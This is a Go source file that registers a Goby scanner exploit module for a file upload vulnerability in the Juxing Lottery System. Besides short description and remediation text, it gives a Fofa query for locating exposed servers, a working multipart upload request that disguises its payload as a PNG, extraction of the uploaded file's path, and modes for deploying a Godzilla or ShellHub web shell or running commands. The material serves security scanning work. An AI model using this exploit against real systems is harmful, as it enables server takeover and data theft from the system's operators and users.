package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Juxing Lottery System /upload/uploadfile/upload.php File Upload Vulnerability",
    "Description": "<p>Juxing Lottery System is an online lottery management system that provides lottery sales, management, and data analysis functions. A file upload vulnerability exists in the /upload/uploadfile/upload.php interface, allowing attackers to upload malicious files, thereby controlling the server or stealing sensitive data.</p>",
    "Product": "Juxing Lottery System",
    "Homepage": "https://www.kvxr.com/",
    "DisclosureDate": "2025-01-23",
    "PostTime": "2025-01-23",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"t_12pxAlpha\" && body=\"hidClientMobileVer\"",
    "GobyQuery": "body=\"t_12pxAlpha\" && body=\"hidClientMobileVer\"",
    "Level": "2",
    "Impact": "<p>Attackers can exploit the /upload/uploadfile/upload.php interface to upload malicious files, enabling remote code execution or access to sensitive server information, leading to full system compromise or data breaches.</p>",
    "Recommendation": "<p>1. Restrict the type and size of uploaded files to ensure only safe file types are allowed.2. Enforce strict permission controls on uploaded files to prevent malicious files from being executed.3. Update the system to the latest version or contact the vendor for security patches.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "ShellHub,Godzilla,Command,Customize",
            "show": ""
        },
        {
            "name": "Command",
            "type": "input",
            "value": "whoami",
            "show": "Mode=Command"
        },
        {
            "name": "Content",
            "type": "input",
            "value": "input your content",
            "show": "Mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/upload/uploadfile/upload.php",
                "follow_redirect": true,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7",
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryK5K4sDixsMVCpfAF",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryK5K4sDixsMVCpfAF\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"{{{FILENAME}}}\"\r\nContent-Type: image/png\r\n\r\nGI\r\n{{{CONTENT}}}\r\n------WebKitFormBoundaryK5K4sDixsMVCpfAF--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "FILE|lastbody|regex|upload\\\\\\/([^\"]+)\"}",
                "FILE_PATH|define|variable|/upload/{{{FILE}}}"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "聚星彩票系统 /upload/uploadfile/upload.php 文件上传漏洞",
            "Product": "聚星彩票系统",
            "Description": "<p>聚星彩票系统是一款在线彩票管理系统，提供彩票销售、管理和数据分析等功能。系统的 /upload/uploadfile/upload.php 接口存在文件上传漏洞，攻击者可利用该漏洞上传恶意文件，从而控制服务器或窃取敏感数据。</p>",
            "Recommendation": "<p>1. 限制上传文件的类型和大小，确保只允许上传安全的文件类型。2. 对上传文件进行严格的权限控制，避免恶意文件被执行。3. 更新系统至最新版本或联系厂商获取安全补丁。</p>",
            "Impact": "<p>攻击者可以通过 /upload/uploadfile/upload.php 接口上传恶意文件，从而实现远程代码执行或获取服务器的敏感信息，导致系统被完全控制或数据泄露。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Juxing Lottery System /upload/uploadfile/upload.php File Upload Vulnerability",
            "Product": "Juxing Lottery System",
            "Description": "<p>Juxing Lottery System is an online lottery management system that provides lottery sales, management, and data analysis functions. A file upload vulnerability exists in the /upload/uploadfile/upload.php interface, allowing attackers to upload malicious files, thereby controlling the server or stealing sensitive data.</p>",
            "Recommendation": "<p>1. Restrict the type and size of uploaded files to ensure only safe file types are allowed.2. Enforce strict permission controls on uploaded files to prevent malicious files from being executed.3. Update the system to the latest version or contact the vendor for security patches.</p>",
            "Impact": "<p>Attackers can exploit the /upload/uploadfile/upload.php interface to upload malicious files, enabling remote code execution or access to sensitive server information, leading to full system compromise or data breaches.</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|FileUpload",
        "SCRIPT_TYPE": "define|variable|php",
        "VUL_URL": "define|variable|/upload/uploadfile/upload.php"
    },
    "VariablesOrder": [
        "TEMPLATE",
        "SCRIPT_TYPE",
        "VUL_URL"
    ],
    "EditType": "fast",
    "PocId": "9984"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}